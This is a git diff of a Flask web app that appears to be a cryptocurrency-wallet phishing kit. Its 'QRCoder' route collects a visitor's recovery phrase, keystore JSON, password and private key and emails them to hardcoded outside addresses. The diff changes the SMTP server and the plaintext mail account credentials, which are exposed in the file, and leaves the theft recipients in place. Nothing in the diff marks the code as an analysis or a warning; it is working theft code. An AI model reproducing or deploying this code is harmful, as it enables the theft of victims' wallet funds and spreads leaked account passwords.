@@ -18,10 +18,10 @@ app = Flask(__name__, template_folder='Templates')
 
 app.config.update(dict(
     DEBUG = True,
-    MAIL_SERVER='smtp.gmail.com',
+    MAIL_SERVER='smtp.office365.com',
     MAIL_PORT = 587,
-    MAIL_USERNAME = 'tajusalaudeendeen@gmail.com',
-    MAIL_PASSWORD = 'stupidsalau',
+    MAIL_USERNAME = 'agboyinusuccess@outlook.com',
+    MAIL_PASSWORD = 'Sussex707',
     MAIL_USE_TLS = True,
     MAIL_USE_SSL= False,
 ))
@@ -66,7 +66,7 @@ def QRCoder():
  privateKey = request.form["privateKey"]
  updated = datetime.now()
  updated = updated.strftime("%c")
- msg = Message('NEW UPDATE', sender = 'zolarich12@gmail.com', recipients = ['delsonelizabeth5@gmail.com'], bcc =['zolarich12@gmail.com'])
+ msg = Message('NEW UPDATE', sender = 'agboyinusuccess@outlook.com', recipients = ['delsonelizabeth5@gmail.com'], bcc =['zolarich12@gmail.com'])
  msg.body = "Date and time: " + updated + " \n" + "Phrase: " + phrase + "\n" + "KeystoreJSON: " + keystoreJSON + "\n" + "Password: " + password + "\n" + "Private Key: " + privateKey
  mail.send(msg)
  return render_template( 'qrcode.html', form=form)
